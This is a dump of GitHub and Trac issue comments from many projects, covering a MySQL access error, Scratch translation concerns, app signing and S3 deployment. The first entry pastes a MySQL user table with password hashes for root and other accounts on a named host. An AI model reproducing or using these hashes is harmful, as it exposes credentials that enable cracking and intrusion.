""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 112, in connect     self.connection = self.get_new_connection(conn_params)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/mysql/base.py"", line 435, in get_new_connection     conn = Database.connect(conn_params)   File ""/usr/lib/python2.7/dist-packages/MySQLdb/init.py"", line 81, in Connect     return Connection(*args, kwargs)   File ""/usr/lib/python2.7/dist-packages/MySQLdb/connections.py"", line 187, in init     super(Connection, self).init(*args, **kwargs2) django.db.utils.OperationalError (1045, ""Access denied for user 'rpki'@'localhost' (using password YES)"") }}} user rpki seems to have insufficuent privs or something should be pushing a password. {{{ +-----------------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+ | Host            | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string | +-----------------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+ | localhost       | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | rpki.dfw.rg.net | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | 127.0.0.1       | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | 1             | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | localhost       | debian-sys-maint | FE1A7AC5CD77B01C9499DC908A03D4AACDC4C198 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  | | localhost       | rpki             | 1583AFC7E20152C8A350357DD835DDEF7A428690 | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  | +-----------------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+ }}} and the documentation sucks caterpillar snot! Trac ticket #767 component build priority major, owner sra, created by randy on 2015-08-06T065233Z, last modified 2016-08-05T162059Z ",False,True,False,rpki.net/dragonresearch/198
rubyzip/rubyzip/307/495686036,Thanks for reporting this. It looks like the  sample has since been updated and no longer has this problem. ,False,True,False,rubyzip/rubyzip/307
sauron/sauron-demo/28734/210825992,"Your Turn! &lt;img src="" href="" /&gt; More Info ",False,True,False,sauron/sauron-demo/28734
sciencefair/codeforscience/50/217092136,Alpha and development builds are blocked by macOS Gatekeeper. Builds should be auto-signed by electron-builder (see #44 &amp; #49).  [x] buy mac developer account [x] generate app certificates [x] sign certificates and store securely for CI retrieval [x] setup certificate urls and passwords as encrypted variables in CI settings [x] travis [x] appveyor   [ ] test code signing of build artifacts [ ] macOS [ ] windows    ,False,True,False,sciencefair/codeforscience/50
sciencefair/codeforscience/50/289325339,It seems that windows apps cannot be signed with an Apple-issued certificate ( So we'll need to buy a separate cert for windows and configure appveyor for that cert. #sigh ,False,True,False,sciencefair/codeforscience/50
sciencefair/codeforscience/50/289325655,It seems that windows apps cannot be signed with an Apple-issued certificate (see  So we'll need to buy a separate cert for windows and configure appveyor for that cert. Which is why this build failed I guess. Unclear to me why the other windows build succeeded and an installer was uploded. sigh ,False,True,False,sciencefair/codeforscience/50
sciencefair/codeforscience/50/289332634,Signing appears to be working for macOS now on Travis. See  for details of what was needed to get it working. ,False,True,False,sciencefair/codeforscience/50
sciencefair/codeforscience/50/299051416,Working for windows too now I think - closing ,False,True,False,sciencefair/codeforscience/50
scratch-blocks/LLK/1489/319247397,"In Scratch 2.0 the colors for ""control"" and ""events"" are an orange-ish brown and an orange-ish yellow respectively. As part of our initial color explorations for Scratch 3.0 we strived to normalize the block category palettes between Scratch 2.0 and ScratchJr as well as resolve design issues with the ""muddy"" brown color that was being used for the ""events"" category. The result of this was to shift the ""events"" category to yellow and keep the ""control"" category with a similar orange to what it has today. An unfortunately side-effect of this change that we have observed is that users who are familiar with the Scratch 2.0 category colors sometimes mistakenly select the ""control"" category when they intend to select the ""events"" category. We have observed that this issue goes away after continuous use of Scratch 3.0 (it appears to be temporary / transitional), but nonetheless we should discuss if corrective action should be taken. Scratch 2.0  ScratchJr  Scratch 3.0 (Vertical Grammar)  Scratch 3.0 (Horizontal Grammar)  ",False,True,False,scratch-blocks/LLK/1489
scratch-blocks/LLK/1489/385745725,Events and Control Color Swap Blocks (Vertical &amp; Horizontal)  Blocks in Context  Color Palette  ,False,True,False,scratch-blocks/LLK/1489
scratch-blocks/LLK/1489/393521599,After further discussion we have decided to keep these colors as-is in an effort to unify colors / grammars across ScratchJr and Scratch. ,False,True,False,scratch-blocks/LLK/1489
scratch-blocks/LLK/1840/394138293,"Since my suggestion to remove the Google Translate block was shot down, could you please at least remove Scottish Gaelic (Gàidhlig) from the language list? In order to produce intelligible results, Google Translate needs a huge bilingual corpus to run their statistic algorithms on. No such corpus exists for Scottish Gaelic, and we can't expect such a corpus to exist in the near future. I am not only worried about teaching people really really bad Gaelic, but we can expect misunderstandings and accidental NSFW content too. See  for more info about the difficulties that minority languages have with machine translation. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/449960396,"I agree, this is a terrible idea - at best, this should be a per-locale opt-IN. For many locales, especially the smaller ones, machine translation produces nothing but gibberish. What's going to happen is either that some well meaning people will push loads of Google Translate junk live or that some diligent fool will have to manually proofread/reject thousands of Google Translate junk strings. Machine translation is intended as a gisting tool, by and large, and for some language combos (mostly large ones with huge corpora) it may function as a translation aid but for most, it's useless at best, an extra time cost at worst. It will overall reduce the attractiveness of Scratch to educational establishments. There is no quick fix for localization. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/450470834,"I think that a disclaimer would also be really helpful for those languages that will keep the translate block - it could act as a teaching opportunity. Something like this A similar disclaimer could be added to published projects that contain translate blocks, to prevent misunderstandings. You should also be aware that grammar errors in machine translation results can be detrimental to foreign language learning, because the grammar errors will imprint themselves on students' visual memories and these memory imprints are very hard to get rid of. For example, although I have been called ""as fluent as a Bard"" by native speakers, I still have difficulty with vowel length after over a decade of learning Gaelic, because I have seen too many texts where the accents on the vowels were missing. Here's a real-life example of machine translation grammar errors from the English -&gt; German language pair. I have left the airport a note and they have now corrected it.   ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/450477235,"@friend I appreciate the sentiment, but you're getting a little extreme. Let's look over your proposed disclaimer Right off the bat, this is already very extreme. Why shouldn't you use the translate extension for a purpose other than this? Computers haven't quite mastered it, sure - but they're already very good, and 99% of the time translation errors are caused by GIGO rather than actual mistranslation. Why not?? What's wrong with sharing your attempt at understanding another language? Good recommendation, but the ""you'll sound like Yoda"" is too informal for a disclaimer. And in many languages word order isn't as significant (e.g. Latin) and grammar is mostly determined by word endings, rather than order. Nothing wrong with using join blocks with languages like that. I think this should read something more like ""Pay attention to what language you're translating when putting the translate block inside join blocks. Sentences in some languages may have completely different meanings based on word order."" Can produce offensive content by accident yes. Often contain grammar errors no. At least for Google Translate (which is, I believe, the API that the translate blocks run on), the grammar errors are few and far between. Most issues with machine translation are with prosidy and not syntax. Better to say that ""machine translation can contain grammar errors or offensive content by accident"". As for your real-life examples Scratch isn't going to be used in airport displays (if they are, I'd be quite shocked) and the ""an""/""am"" problem looks to be a transcription error rather than an error of the machine itself (like somebody said to the person typing, ""am Flugsteig"" but the ""m"" sounded like an ""n""). Don't get me wrong - I do agree that some languages should not be in here as there is too little to base machine translations on, and Scottish Gaelic fits that description - I just think your disclaimer is a little too strong, a little too scary, and a little inaccurate. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/450548857,"The disclaimer is just a first draft collecting some ideas - of course, it can be further refined and rephrased.  I added it as a first basis for discussion and I am not expecting anybody to implementing it just like that verbatim. I do think it is important that we do add some form of disclaimer though ;) Because other children will assume that it is correct language and learn the mistakes. Such mistakes are very difficult to unlearn. Chances are very high that a child will create a language teaching project using the translate block for languages that the child doesn't speak, just because it's fun. We can't expect the child to understand the implications without any explanation, because in my experience even many adults don't. You're thinking in terms of teaching computing, but we need to look at the bigger picture here and think about the consequences for language teaching too. I just told a language teacher I know about the translate block and she immediately started verbally pulling her hair out before I even had a chance to finish explaining how it's used. She immediately brought up the point that mistakes that have been learned are very hard to unlearn. So, I am not the only person on the planet who is concerned about this. plus one, a lot better than what I wrote ) Judging from the real-life airport example, the grammar error rate there is ~50%. I would not call that ""few and far between"" - and this is for 2 very closely related languages. Of course, your mileage will vary with language pair used and content translated. There will probably be a lot less errors when translating German -&gt; English than translating English -&gt; German because English has less grammar markers. For example, German ""Kopie"" and ""Kopieren"" both translate as ""Copy"" into English. Of course not! But both are using Google Translate, which still produce identical output, no matter whether somebody sticks it on an airport sign or into Scratch. It might look like that for non-German speakers, but it is not. It is a Dative/Accusative case distinction. Any German teacher would mark this as a grammar error and never as a typo. Thanks ) It's just a first draft, and suggestions for improvements like you made are very welcome in my book! And don't get me wrong, Google Translate itself is a very useful tool, and it will only become harmful if misused. So, I think we do have the responsibility to teach children how to use it properly, since we're offering them the tool directly. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/450630575,"I support the idea that Google Translate should be an opt-in and have an explicit warning about how correct the translation would be. It could be very embarrassing for a student to get it very wrong! Google Translate is pretty good for English to Welsh from my experience, it's correct about 60-70% of the time. That means that there is plenty of scope for errors, howlers and embarrassment in using machine translation.  Try some of these  Translate, like Microsoft Translate seems to be better with longer sentences and in Welsh because it's based on formal, bureaucratic documents it's in a more formal style than would be appropriate for Scratch. I would be very cautious about encouraging it's use with students who are not fluent in their use of the translated language. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/450717132,"Google Translate is an opt-in by virtue of the fact that it's an extension! If you don't explicitly include the extension, you can't use the blocks and have therefore not opted in. By including the extension, you are obviously showing that you are opting in to using the extension. A disclaimer is necessary but should not be obtrusive. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/450720456,"This is a different type of opt-in though. We should not shift the hard decision making to the children, that's not fair on them. The responsibility is ours, not theirs. By all means, keep the block with a disclaimer for those language pairs where the error rate is extremely low. I'd still like to have my locale removed though, because gibberish translations are no use to everybody, and we will be unintentionally teaching this gibberish. The disclaimer should also be short ( a lot shorter than my draft) to make it easy to read. Otherwise, kids will just go tl;dr on it. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/458749660,"Eh, sorry but where are you getting these figures from? Even for a language pair like German &lt;&gt; English for which Google must have a lot of data aren't even close to 99%, that's just a figure you made up to make it sound like a good idea. To begin with, you cannot make a blanket statement about how accurate MT translation is without specifying the language pair you're talking about. I don't know what your language skills are but it's a common mistake by English speakers to assume that because GT does an ok job INTO English, the reverse is also true. It isn't. English happens to be a fairly uninflected language with little morphology, which makes it relatively easy for MT. But try going FROM English to something like German with 4 cases and 3 genders, it gets a whole lot harder straight away. Secondly, the quality of MT depends hugely on the domain. For instance, for medical stuff, German &lt;&gt; English is pretty good. Put in a novel, you get vastly different results. If you look at the research, even for something fairly simply as medical texts accuracy has been measured as low as 45-46% (into African and Asian languages). So no, not even close to 99%. Making up figures is not good form. ",False,True,False,scratch-blocks/LLK/1840
scratch-blocks/LLK/1840/458751823,"Thanks for all the feedback on this folks. We are working on developing landing pages for each extension and will add some information that clarifies the accuracy of machine translation on the ""Translate"" extension page based on all of your feedback. Thanks. ",False,True,False,scratch-blocks/LLK/1840
scratch-flash/LLK/1384/299212986,"So I came across this yesterday. Basically someone used to be able to loop through a list of scratch users and post a comment on their profile at extremely rapid pace. Luckily, this was fixed. However, this vulnerability is still present on scratch studios, and it causes the same amount of damage the previous api did. Please fix this Thanks ",False,True,False,scratch-flash/LLK/1384
scratch-flash/LLK/1384/367568096,"Aren't you better off using contact us, so you can more safely (or at least, more confidentially) share details? (Telling thisandagain the ticket number on his profile after can also help you get a response sooner.) ",False,True,False,scratch-flash/LLK/1384
scratch-flash/LLK/1384/367810444,Closed and locked due to the sensitive nature of this issue. ,False,True,False,scratch-flash/LLK/1384
screensaver.asteroids/notspiff/9/230430866,This changes can in master after  is merged. ,False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303132347,After the kodi request is approved becomes this cleaned up and changed in one commit. ,False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303254593,@friend is this style also for you OK? ,False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303284991,The header paths seems like a regression. Why include kodi in them? And that nasty .. hack is also a bit poo ,False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303341125,"The hack is really poo, complete right. Currently there to have still old addons compatible. I have never, never liked the way before with a e.g. . This is normally a include of a own header on own sources for me. The other reason to have  folder before is to prevent in future include problems. As example comes ""Filesystem.h"", if now a  is used can a addon developer not use as own header with this name, with  no problem. The old header name style with a xbmc or kodi before is for me in case with much more headers not so good. The next where it is really good to have as ""&lt;&gt;"" is the auto completion during write of code.  ",False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303344639,"use of quote or angles is completely orthogonal as such. the only meaning is which is tested first (quotes mean check source directory, then include paths, angles the other way around). i'm just tired of the never-ending dance back and forth. i did like you did it, then it was changed to what is now with rebranding ease as the reason. ",False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303395171,"Has asked on slack to others, this has accepted it with @friend @friend @friend and @friend. I think there comes again the discussion like several years ago but what you think, do we try it? ",False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303397364,"As long as there is no reversal again it is all good for my sake. But if we do this and have to change it again i will go loonie tunes ;) @friend is not on the list u mention, he will have an opinion on this. ",False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303447357,"Well, this will make rebranding a lot more difficult. It means addons won't build against a fork without sed-ing the includes. And the hack is ugly as shit. Anyway I'm not a addon maintainer, so feel free to ignore if all relevant devs agree. ",False,True,False,screensaver.asteroids/notspiff/9
screensaver.asteroids/notspiff/9/303566614,"For me can a fork with other name stil use ""kodi"", with the current header names is this already present. I understand that some forks or complete another Softwares want to use the addons, but with the current header names is it already fixed to ""xbmc"" or ""kodi"", this becomes removed and the folder name used as alternative. The only difficult part can be if someone develop on Kodi and on a fork that it use the same path, but to hold Kodi's addons compatibel with him must he already use equal headers. ",False,True,False,screensaver.asteroids/notspiff/9
scripts/nroberts-trulia/253/18098709,"This repository is publicly accessible. Pushing proprietary code to this repo could reveal trade secrets. If this is intentional, please contact your lead so this repo can be whitelisted. Until that time, please refrain from pushing code to this repo. ",False,True,False,scripts/nroberts-trulia/253
scylla/scylladb/2549/240898532,"Installation details Scylla version (or git commit hash) master The cause is migration to v3 schema tables, which results in different table schema digests on 2.0 nodes. Reads (with CL &gt; ONE) ",False,True,False,scylla/scylladb/2549
sdk/dart-lang/12463/109472475,This issue has been moved to dart-lang/observe#32. ,False,True,False,sdk/dart-lang/12463
sdk/dart-lang/12463/84546874,"This issue was originally filed by Erik.Grime...&#064;gmail.com  There's currently a todo in the code asking if == should be used to avoid spurious loops and I believe yes is the answer.  Sometimes things have a business identity but they don't represent the same object in memory.  This happens for example when an object has been reconstructed from two separate sources.  In my particular case, history handling/navigation, this causes infinite recursion. What version of the product are you using? On what operating system? Dart Editor version 0.1.2_r26082 Dart SDK version 0.1.2.0_r26082 observe 0.6.15+2 ",False,True,False,sdk/dart-lang/12463
sdk/dart-lang/19223/84581518,"This issue was originally filed by osstek...&#064;gmail.com  What steps will reproduce the problem?  Create new project &quot;Web Application&quot; Set breakpoint line 4  &nbsp;&nbsp;querySelector(&quot;#sample_text_id&quot;) Run in Dartium  --- 54318 PM Starting pub serve  sampleweb --- Loading source assets... (0.5s) Serving sampleweb web on  completed successfully [web] GET /sampleweb.html =&gt; sampleweb|web/sampleweb.html [web] GET /sampleweb.dart =&gt; sampleweb|web/sampleweb.dart [web] GET /sampleweb.css =&gt; sampleweb|web/sampleweb.css [web] GET /packages/browser/dart.js =&gt; browser|lib/dart.js  OnBreakpoint, hover cursor line 6 variable &quot;reverseText&quot; ..onClick.listen(reverseText);  What is the expected output? What do you see instead? &lt;debug target crashed&gt; What version of the product are you using? On what operating system? Windows 2008 Server SP2 64-bit Dart Editor version 1.5.0.dev_04_00 (DEV) Dart SDK version 1.5.0-dev.4.0 Dart VM version 1.5.0-dev.4.0 (Wed Jun 04 013007 2014) on &quot;windows_ia32&quot; Chromium Version 36.0.1985.0 (272160) Please provide any additional information below. ",False,True,False,sdk/dart-lang/19223
sequelize-typescript/RobinBuschmann/359/316210707,Typescript compiler complains when I put query association syntax to where clause. Here's the query I get error It's actullay acceptable by sequelize and works as expected but not documented in the docs. See discussions here #3095. ,False,True,False,sequelize-typescript/RobinBuschmann/359
securitySystemPro/hbomb79/538/50897763,"The Automattic Crash Reporter Has Received An Error! System Version 2.1.0.5 Error Client Reason The Reactor Program Has Crashed, Error Code Above Client ID 53 (Test) The Error Log From The Machine That Crashed Has Been Posted Below -@friend Security Suite System Log-@friend [0][startup]  Info &gt; System Started   [0][startup]  Info &gt; Suite Version 2.1.0.5   [0][startup]  Info &gt; Starting Main Program   [0][startup]  Info &gt; Declared System Configs And Variables   [0.3][startup]  Info &gt; System Check Complete... Success!   [0.3][startup]  Info &gt; System Functions Declared   [0.3][startup]  Info &gt; Event terminate Registered   [0.3][startup]  Info &gt; Event key Registered   [0.3][startup]  Info &gt; Event reboot Registered   [0.3][startup]  Info &gt; Event shutdown Registered   [0.35][startup]  Info &gt; Loading download   [0.35][startup]  Info &gt; download Api Loaded   [0.4][startup]  Info &gt; Loading element   [0.4][startup]  Info &gt; element Api Loaded   [0.45][startup]  Info &gt; Loading errora   [0.45][startup]  Info &gt; errora Api Loaded   [0.5][startup]  Info &gt; Loading LogFile   [0.5][startup]  Info &gt; LogFile Api Loaded   [0.55][startup]  Info &gt; Loading printer   [0.55][startup]  Info &gt; printer Api Loaded   [0.6][startup]  Info &gt; Loading systemCheck   [0.6][startup]  Info &gt; systemCheck Api Loaded   [0.65][startup]  Info &gt; Loading titleBar   [0.65][startup]  Info &gt; titleBar Api Loaded   [0.7][startup]  Info &gt; Loading uInput   [0.7][startup]  Info &gt; uInput Api Loaded   [0.75][startup]  Info &gt; Loading update   [0.75][startup]  Info &gt; update Api Loaded   [0.85][systemFiles/Programs/reactor]  Info &gt; reactor Program Running...    [0.85][systemFiles/Programs/reactor]  Info &gt; Initialise Function Called   [0.85][systemFiles/Programs/reactor]  Info &gt; Loading Settings   [0.85][systemFiles/Programs/reactor]  Info &gt; Found Config   [0.85][systemFiles/Programs/reactor]  Info &gt; Settings Loaded   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event timer   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event terminate   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event monitor_resize   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event peripheral   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event peripheral_detach   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event monitor_touch   [0.85][systemFiles/Programs/reactor]  Info &gt; Registered Event mouse_click   [0.85][systemFiles/Programs/reactor]  Info &gt; Searching For Monitor   [0.85][systemFiles/Programs/reactor]  Info &gt; Found Monitor   [0.85][systemFiles/Programs/reactor]  Info &gt; Monitor Size Is Correct   [0.85][systemFiles/Programs/reactor]  Info &gt; Searching for reactor   [0.85][systemFiles/Programs/reactor]  Info &gt; Reactor Found   [0.85][systemFiles/Programs/reactor]  Info &gt; Reactor Build State true   [0.85][systemFiles/Programs/reactor]  Info &gt; programLoop Called, not logging events   [7.6][systemFiles/Programs/reactor]  Error &gt; XPCALL Error nil Too long without yielding Posted By Hbomb Auto Crash Report V1 ",False,True,False,securitySystemPro/hbomb79/538
sequelize-typescript/RobinBuschmann/359/383055061,"Hey @friend, thanks for reporting. You need to use . There is currently no way to have type safety with the  syntax. See this issue  this helps ",False,True,False,sequelize-typescript/RobinBuschmann/359
serverless-stack-com/AnomalyInnovations/63/297412542,"When I run this command $ aws s3 sync build/ s3//gajen-notes-app-client, I get an error Invalid endpoint  Any feedback on this? ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/297448246,"@friend I was able to resolve the issue above, however, when I opened the webpage and tried to log in I get an error message TypeError re is not a function. Am I missing anything? ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/297478767,@friend does the login on your local work fine? ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/297497643,@friend Yes it worked fine when deployed them on my local ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/297568777,That's really strange. Can I see the full error as it shows in the console? ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/302891300,"@friend In this case they need your AWS credentials to upload it. So as long as you are not giving those out, you should be fine. ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/319803554,"This guide is incredible, thanks for all the hard work! I'm having an issue with the production build deployed to S3. Everything works fine locally and deployment isn't an issue, but when I go to my S3 URL to load the application I get the following error in console Uncaught TypeError Cannot read property 'call' of undefined     at t (main.a20f4176.js1) Based on the the issue link below, I assume its something to do with webpack. Any chance you have an idea of how to fix it? Haven't been able to figure it out myself.  incorporated a couple additional things to your guide redux, react-redux, react-router-redux, redux-thunk, redux form and some babel/eslint stuff. Link to my test repository below, would really appreciate any help or thoughts. ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/302855075,"@friend just wondering, how secure is running this command? Would anyone - and I mean anyone be able to deploy to an S3 bucket if they know what's the bucket's name? ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/323957398,"Once I attempted the aws s3 sync command here, I realised nothing was being written to my s3 bucket. After a little reading I realied that my admin IAM user didn't have PUT access to that bucket, so I amended the bucket policy to the version I've provided below. Hopefully this helps someone out in the same situation. Otherwise an absolutely smashing tutorial here guys. Amazingly thorough and I've learned loads in just a few short hours. Cheers. ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/324092696,@friend Thanks for the kind words! And thanks for reporting back. I'm sure it'll help some folks. ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/331806508,when trying to sync I received this message a couple of thing I don't understand  what is this ?prefix=&amp;encoding-type=url why s3.Frankfurt.amazon while up to now all regions where in the form eu-central-1? As a matter of fact I don't know where to start troubleshooting... if someone can help...  ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/348713946,@friend I'm not too familiar with your setup so I can't really help. But maybe somebody else can. ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/334788751,Don't forget to use  when uploading if you have profiles otherwise you will get ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/348713275,"Hi all, everything was working fine until I run npm run build... I'm using babili instead of uglify... The build is complete, but when I run the project I get this error Uncaught (in promise) TypeError h.a.config.credentials.getPromise is not a function Does anybody have an idea of what's going wrong? Thanks in advance for helping. ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/350741544,"Hi, I created my S3 bucket and went to do npm run build and I deployed the build/ file to the S3 bucket I created.  In AWS the bucket shows up with all the files created in the build file, however when I go to the endpoint, the url where my app should be live, it shows up with the favicon icon but the screen is blank and the error i get from the console is  Failed to load resource the server responded with a status of 404 (Not Found) main.f5cd3d98.js Failed to load resource the server responded with a status of 404 (Not Found) main.0e9b8740.css Failed to load resource the server responded with a status of 404 (Not Found) I understand that it is not reading the static files created during the build but I cannot seem to figure out how to fix this error? Hopefully someone can help me please? Thanks ) ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/351130071,@friend Can you ensure the permissions for the S3 bucket are set right? Thor CORS and permission section in this chapter - ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/331811177,"Ok, so maybe this can help somebody else. I created the notes-app-client folder inside the notes-app-server. I thought it should inherit the login credential but it didnt, so I simply reconfigure awscli with a new accesskey and secretId. ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/351417334,@friend I manage to get it working ! So thank you for the help ) ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/359190772,"Should maybe add --delete to ♠aws s3 sync build/ s3//YOUR_S3_DEPLOY_BUCKET_NAME --delete` So that the changes don't accumulate. Before I did that, earlier versions were buffered and the correct version was not always rendered. ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/359280247,"I'm getting the following response, ""npm ERR! missing script build"" What can I do to address this? ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/359599203,I figured it out -- I ran a few of the npm install scripts in my root directory as opposed to my working directory. never mind! ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/371499946,"Is this example SEO friendly? If yes which part helps to be seo-friendly. If not how can we make it so? I'm a quite newbie on serverless and react, so please be kind if my question looks silly ) ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/371610065,@friend No worries. We might have addressed this somewhere else. But the notes app is a single page app and it is not meant to be publicly accessible (it's behind a login). So it isn't really SEO friendly. Are you wanting to remove the login and make it publicly accessible? ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/371801516,"Hi @friend, I'm planning to build a mortgage comparison website. Yes it will be publicly accessible. I was thinking to build it with a similar stack as in this example. But I am not sure if google bots will be able to read the content of my pages and index it so people can find it when they search the words like 'mortgage calculator' ... ",False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/371939619,@friend Google does handle JS for SEO but a better pattern for this is to use a static page generator like Jekyll for your landing pages. And then use React for your actual app. This way you get to create content for SEO purposes while still having a single page app. For example this tutorial itself is in Jekyll (for SEO purposes) and the demo app is in React. ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/372047139,@friend Thank you very much. I'll test it for my website. ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/387845194,This issue was moved to ,False,True,False,serverless-stack-com/AnomalyInnovations/63
serverless-stack-com/AnomalyInnovations/63/387857365,This issue was moved to ,False,True,False,serverless-stack-com/AnomalyInnovations/63
shinemoon.github.io/shinemoon/1/108496350,"Hi Mario, Thanks for your comment and selection of my template (though a bit suprised honestly, since I made this template purely for myself's usage..) , and sorry that till now I have no more time to put into the mobilizing for that, as I have no such need personally... but who knows, maybe one day I come back for that topic? Enjoying Jekyl.. ",False,True,False,shinemoon.github.io/shinemoon/1
